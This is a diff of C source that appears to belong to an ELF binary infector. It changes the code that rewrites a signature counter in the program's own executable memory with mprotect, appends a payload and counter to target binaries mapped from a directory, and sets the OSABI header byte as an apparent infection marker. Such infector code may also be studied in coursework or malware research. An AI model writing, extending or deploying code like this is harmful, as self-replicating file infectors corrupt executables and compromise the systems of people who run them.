@@ -490,34 +490,19 @@ static size_t atoi(const char *str) {
 }
 
 static int updateSignature(void) {
-  size_t  i;
-  size_t  *tmp;
-  char    *str;
-  size_t  signature;
+  unsigned long  *signature;
 
-  str = (void *)dynamicSignature - sizeof(size_t);
-  if (mprotect(align((size_t)dynamicSignature - sizeof(size_t)), sizeof(size_t), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
+  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
     return (-1);
-  signature = atoi((void *)dynamicSignature - sizeof(size_t));
-  signature -= 1;
-  i = 0;
-  while (signature != 0) {
-    str[i] = signature % 10 + 48;
-    signature /= 10;
-    i += 1;
-  }
-  tmp = (size_t *)str;
-  *tmp = (((*tmp & 0xff) << 56) | ((*tmp & 0xff00) << 40) |
-        ((*tmp & 0xff0000) << 24) | ((*tmp & 0xff000000) << 8) |
-        ((*tmp & 0xff00000000) >> 8) | ((*tmp & 0xff0000000000) >> 24) |
-        ((*tmp & 0xff000000000000) >> 40) | ((*tmp & 0xff00000000000000) >> 56));
-  if (mprotect(align((size_t)dynamicSignature - sizeof(size_t)), sizeof(size_t), PROT_EXEC | PROT_READ) < 0)
+  signature = (void *)dynamicSignature - sizeof(unsigned long);
+  *signature -= 1;
+  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_EXEC | PROT_READ) < 0)
     return (-1);
   return (0);
 }
 
 const char  signatureNbr[8] __attribute__ ((section (".text#"))) = {
-  "\x34\x32\x34\x32\x34\x32\x34\x32"
+  "\x00\x00\x00\x00\x00\x00\x00\x00"
 };
 static void       dynamicSignature(void) {}
 
@@ -559,7 +544,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     close(fd);
     return (1);
   }
-  len = strlen(payload) + sizeof(size_t) + 1;
+  len = strlen(payload) + MAX_DYN_LEN + 1;
   if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
     close(fd);
     munmap(tmp, stats.st_size);
@@ -599,13 +584,34 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     }
 }
 
+static void itoa(char *buffer, unsigned long n) {
+  int   i;
+  unsigned long  tmp;
+
+  i = 0;
+  tmp = n;
+  while (tmp != 0) {
+    tmp /= 10;
+    buffer[i] = 0;
+    i += 1;
+  }
+  if (i == 0) {
+    buffer[i] = '0';
+  }
+  while (i > 0) {
+    buffer[i - 1] = n % 10 + 48;
+    i -= 1;
+    n /= 10;
+  }
+}
+
 static void  appendSignature(struct bfile file) {
   size_t  len;
   char payload[] = PAYLOAD;
 
   len = strlen(payload);
-  memcpy(((void *)file.header) + file.size - len - sizeof(size_t) - 1, payload, len);
-  memcpy(((void *)file.header) + file.size - sizeof(size_t) - 1, (void *)dynamicSignature - sizeof(size_t), sizeof(size_t));
+  memcpy(((void *)file.header) + file.size - len - MAX_DYN_LEN - 1, payload, len);
+  itoa(((void *)file.header) + file.size - MAX_DYN_LEN - 1, *((unsigned long *)((void *)dynamicSignature - sizeof(unsigned long))));
   memset(((void *)file.header) + file.size - 1, 0, 1);
   file.header->e_ident[EI_OSABI] = 0x10;
 }
